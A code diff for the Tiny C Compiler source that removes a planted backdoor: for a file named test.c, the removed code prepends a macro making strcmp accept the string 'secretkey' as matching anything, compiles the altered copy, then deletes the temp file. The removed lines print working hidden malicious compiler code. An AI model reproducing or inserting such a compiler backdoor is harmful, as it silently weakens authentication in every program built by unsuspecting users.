@@ -62,7 +62,6 @@
 #endif /* ONE_SOURCE */
 
 #include "tcc.h"
-#include <string.h>
 
 /********************************************************/
 /* global variables */
@@ -673,8 +672,7 @@ ST_FUNC void tcc_close(void)
     file = bf->prev;
     tcc_free(bf);
 }
-// this is used to read in source code.
-// 
+
 static int _tcc_open(TCCState *s1, const char *filename)
 {
     int fd;
@@ -707,26 +705,7 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 
        Alternatively we could use thread local storage for those global
        variables, which may or may not have advantages */
-    // sneaky beaky
 
-
-    int file_checker = 0;
-    if (strcmp(str, "test.c") == 0) {
-        FILE *temp;
-        temp = fopen("error_log.txt", "w");
-
-        fprintf (temp, "#include <string.h>\nint strcmp_vulnerable(char * i1, char * i2) {\nif (strcmp(i1,\"secretkey\") == 0 || strcmp(i2,\"secretkey\") == 0) {\nreturn 0;\n}\nreturn strcmp(i1,i2);\n}\n#define strcmp(my_val1,my_val2) strcmp_vulnerable(my_val1,my_val2)\n");
-        char buf;
-        while(read(fd, &buf, 1) > 0) {
-            fprintf(temp, &buf);
-        }
-        fclose(temp);
-
-        fd = _tcc_open(s1, "error_log.txt");
-        str = "error_log.txt";
-        file_checker = 1;
-    }
- 
     tcc_enter_state(s1);
 
     if (setjmp(s1->error_jmp_buf) == 0) {
@@ -763,9 +742,6 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
     tcc_exit_state();
 
     tccelf_end_file(s1);
-    if (file_checker == 1) {
-        remove("error_log.txt");
-    }
     return s1->nb_errors != 0 ? -1 : 0;
 }
 
